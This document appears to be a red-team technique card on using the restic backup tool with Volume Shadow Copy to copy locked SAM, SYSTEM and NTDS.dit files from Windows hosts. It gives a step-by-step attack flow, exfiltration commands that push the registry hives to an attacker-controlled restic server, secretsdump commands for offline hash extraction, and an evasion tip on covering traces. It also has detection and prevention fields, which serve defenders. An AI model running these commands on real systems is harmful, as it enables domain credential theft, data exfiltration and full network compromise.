notes:
=== Restic Offensive Backup — VSS-Based File Exfiltration ===
Use restic with VSS to back up locked files (SAM, NTDS.dit) to attacker-controlled repository.

=== WHY VSS + RESTIC ===
SAM, NTDS.dit, and other critical files are locked by the OS while running.
restic --use-fs-snapshot creates a VSS (Volume Shadow Copy) before backing up.
VSS snapshot contains copies of locked files not actively held by the OS.
Result: can back up NTDS.dit from a live DC without stopping the AD DS service.

=== ATTACK FLOW ===
Step 1: Initialize a restic repository (local or remote)
  restic init --repo C:\Temp\backup_repo
  Enter repository password when prompted

Step 2: Set password environment variable (avoid interactive prompt for scripts)
  $env:RESTIC_PASSWORD = "backup_password"

Step 3: Create backup with VSS snapshot (captures locked files)
  restic -r C:\Temp\backup_repo backup C:\Windows\NTDS --use-fs-snapshot
  restic -r C:\Temp\backup_repo backup C:\Windows\System32\config --use-fs-snapshot

Step 4: List snapshots to confirm
  restic -r C:\Temp\backup_repo snapshots

Step 5: Restore backed-up files to accessible location
  restic -r C:\Temp\backup_repo restore latest --target C:\Temp\restored --include C:\Windows\NTDS

Step 6: Extract credentials offline
  python3 secretsdump.py -ntds C:\Temp\restored\Windows\NTDS\ntds.dit -system C:\Temp\restored\Windows\System32\config\SYSTEM LOCAL

=== LEGITIMATE BACKUP ABUSE ===
If restic is already installed and configured (backup infrastructure exists):
Find backup credentials in scripts/env vars → use existing repository → browse/restore any backup
Backup agents typically have admin-level access to all systems they protect

=== CHAINING CONTEXT ===
Restic backup of DC → NTDS.dit + SYSTEM → secretsdump → all domain hashes → full compromise
Restic backup to remote repo (S3, SFTP) → exfiltrate sensitive files off-network
Existing backup server compromise → access backups from all org systems → single pivot point
--use-fs-snapshot makes this applicable even without SeBackupPrivilege on live files

recommended.note: Restore the snapshot and extract hashes.

name: Pillaging - restic VSS Backup of Locked Hives
description: restic with --use-fs-snapshot uses VSS to back up files that are normally locked - including the live SAM/SYSTEM/SECURITY registry hives - which you then restore and dump offline.

defense.why_it_works: Restic supports VSS snapshots (--use-fs-snapshot) allowing backup of files locked by the OS (SAM, NTDS.dit, SYSTEM hives). By running restic from a low-privilege position with sufficient VSS rights, an attacker can exfiltrate these locked files to an attacker-controlled restic repository, then restore them offline for credential extraction.
defense.prerequisites: Shell access with ability to run restic. Rights to create VSS snapshots (local admin or SeBackupPrivilege may be needed). Network access to an attacker-controlled restic repository.
defense.impact: Exfiltration of locked system files including NTDS.dit to an attacker-controlled backup repository, enabling offline credential extraction without leaving obvious traces on the target.
defense.detection: restic.exe execution by non-backup user with --use-fs-snapshot flag. VSS shadow copy creation (Event 8222). Large outbound data transfer via restic. New restic repository initialization to unknown host.
defense.artifacts: Process: restic.exe --use-fs-snapshot backup to unknown repo | Event 8222: VSS snapshot created by non-SYSTEM process | Network: large outbound backup stream to attacker IP
defense.prevention: Block outbound restic connections from servers via firewall (restic uses REST API over HTTPS or SFTP). Restrict VSS creation rights. Monitor restic execution by non-backup service accounts. Apply egress filtering to prevent exfiltration to unknown hosts.
defense.misconfiguration: No egress filtering from servers. restic binary available in PATH. No monitoring on VSS creation by non-backup processes. Outbound HTTPS to arbitrary hosts permitted from servers.
defense.vulnerable_config:
# Attacker exfiltrates locked files via restic backup:
restic.exe -r rest:http://attacker:8000/ --password-file .\pass.txt init
restic.exe -r rest:http://attacker:8000/ --password-file .\pass.txt backup C:\Windows\System32\config --use-fs-snapshot

# On attacker machine - restore and dump:
restic -r rest:http://attacker:8000/ restore latest --target .\restore
secretsdump.py -sam restore\SAM -system restore\SYSTEM LOCAL
defense.secure_config:
# Firewall egress filtering:
# Block outbound TCP from servers to non-approved backup IPs
# Allow only \\approved-backup-server on port 443

# Restrict VSS creation:
# Remove SeBackupPrivilege from standard users
# Monitor: Event 8222 VSS creation by non-SYSTEM process

# Restrict restic binary:
# WDAC: only svc_backup allowed to execute restic.exe
defense.evasion: Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop.
